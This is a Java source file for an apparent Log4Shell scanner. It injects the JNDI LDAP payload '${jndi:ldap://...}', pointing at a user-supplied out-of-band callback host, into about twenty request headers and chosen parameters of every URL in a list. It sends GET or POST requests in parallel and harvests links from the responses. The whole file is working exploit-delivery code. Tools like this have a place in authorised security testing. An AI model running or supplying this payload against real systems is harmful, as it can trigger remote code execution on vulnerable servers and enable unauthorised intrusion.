import org.apache.http.client.HttpClient;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.jsoup.nodes.Element;

import java.io.*;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class log4jscanner {

    private static final String OUTPUT_FILE = "extracted_urls.txt";

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        try {
            HttpClient client = HttpClients.createDefault();
            System.out.println("Enter the Burp Collaborator URL:");
            String oobPayload = scanner.nextLine();
            String payload = "${jndi:ldap://" + oobPayload + "}";

            System.out.println("Enter the path to the file containing URLs (one per line):");
            String filePath = scanner.nextLine();
            ArrayList<String> urls = readUrlsFromFile(filePath);


            int recursiveDepth = 2;

            System.out.println("Do you want to add custom headers? (yes/no)");
            String useCustomHeaders = scanner.next().trim().toLowerCase();
            String[] headersToUse;

            if ("yes".equals(useCustomHeaders)) {
                System.out.println("Enter your custom headers (comma-separated):");
                String customHeaders = scanner.next();
                headersToUse = customHeaders.split(",");
            } else {
                headersToUse = new String[] {
                        "User-Agent",
                        "X-Api-Version",
                        "X-Requested-With",
                        "Referer",
                        "X-Forwarded-For",
                        "X-Forwarded-Host",
                        "X-Forwarded-Server",
                        "X-Custom-IP-Authorization",
                        "X-Original-URL",
                        "X-Rewrite-URL",
                        "X-Client-IP",
                        "X-Remote-IP",
                        "X-Remote-Addr",
                        "X-Host",
                        "X-Custom-Header",
                        "X-Forwarded",
                        "Forwarded-For",
                        "Forwarded",
                        "Via",
                        "True-Client-IP",
                        "X-Real-IP"
                };
            }

            System.out.println("Enter parameter names (format: name1,name2):");
            String paramsInput = scanner.next();
            String[] params = paramsInput.split(",");

            System.out.println("Do you want to send a GET or POST request? (G/P):");
            String requestType = scanner.next().trim().toUpperCase();

            ExecutorService executor = Executors.newFixedThreadPool(5);
            for (String url : urls) {
                Runnable task = () -> {
                    try {
                        sendRequest(client, url, headersToUse, params, payload, requestType, recursiveDepth);
                    } catch (Exception e) {
                        System.out.println("Error handling request for URL: " + url);
                        e.printStackTrace();
                    }
                };
                executor.execute(task);
            }
            executor.shutdown();
            executor.awaitTermination(1, TimeUnit.HOURS);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            scanner.close();
        }
        System.out.println("End");
    }

    private static ArrayList<String> readUrlsFromFile(String filePath) throws Exception {
        ArrayList<String> urls = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(new File(filePath)))) {
            String line;
            while ((line = reader.readLine()) != null) {
                urls.add(line.trim());
            }
        }
        return urls;
    }

    private static void sendRequest(HttpClient client, String url, String[] headers, String[] params, String payload, String requestType, int recursiveDepth) throws Exception {
        if (recursiveDepth <= 0) {
            return;
        }

        recursiveDepth--;

        if ("P".equals(requestType)) {
            sendPostRequest(client, url, headers, params, payload);
        } else if ("G".equals(requestType)) {
            sendGetRequest(client, url, headers, params, payload);
        }
    }

    private static void sendPostRequest(HttpClient client, String url, String[] headers, String[] params, String payload) throws Exception {
        HttpPost postRequest = new HttpPost(url);
        postRequest.setHeader("Content-type", "application/x-www-form-urlencoded");

        StringBuilder formData = new StringBuilder();
        for (String param : params) {
            if (formData.length() > 0) formData.append("&");
            String key = param;
            formData.append(URLEncoder.encode(key, "UTF-8"))
                    .append("=")
                    .append(URLEncoder.encode(payload, "UTF-8"));
        }

        for (String header : headers) {
            postRequest.setHeader(header.trim(), payload);
        }

        StringEntity requestEntity = new StringEntity(formData.toString());
        postRequest.setEntity(requestEntity);

        HttpResponse response = client.execute(postRequest);
        String responseBody = EntityUtils.toString(response.getEntity());
        EntityUtils.consume(response.getEntity());
        printResponseDetails(response, responseBody);
        extractUrls(url, responseBody);
    }

    private static void sendGetRequest(HttpClient client, String url, String[] headers, String[] params, String payload) throws Exception {
        StringBuilder urlWithParams = new StringBuilder(url);
        urlWithParams.append("?");
        for (String param : params) {
            if (urlWithParams.charAt(urlWithParams.length() - 1) != '?') urlWithParams.append("&");
            String key = param;
            urlWithParams.append(URLEncoder.encode(key, "UTF-8"))
                    .append("=")
                    .append(URLEncoder.encode(payload, "UTF-8"));
        }

        HttpGet getRequest = new HttpGet(urlWithParams.toString());
        for (String header : headers) {
            getRequest.setHeader(header.trim(), payload);
        }

        HttpResponse response = client.execute(getRequest);
        String responseBody = EntityUtils.toString(response.getEntity());
        EntityUtils.consume(response.getEntity());
        printResponseDetails(response, responseBody);
        extractUrls(url, responseBody);
    }

    private static void printResponseDetails(HttpResponse response, String responseBody) {
        System.out.println("HTTP Response Code: " + response.getStatusLine().getStatusCode());
        System.out.println("Response Body: " + responseBody);
    }

    private static void extractUrls(String baseUrl, String htmlContent) throws IOException {
        Document doc = Jsoup.parse(htmlContent, baseUrl);
        Elements links = doc.select("a[href], form[action]");
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(OUTPUT_FILE, true))) {
            for (Element link : links) {
                String foundUrl = link.tagName().equals("form") ? link.absUrl("action") : link.absUrl("href");
                if (!foundUrl.isEmpty()) {
                    writer.write(foundUrl + "\n");
                }
            }
        }
    }
}
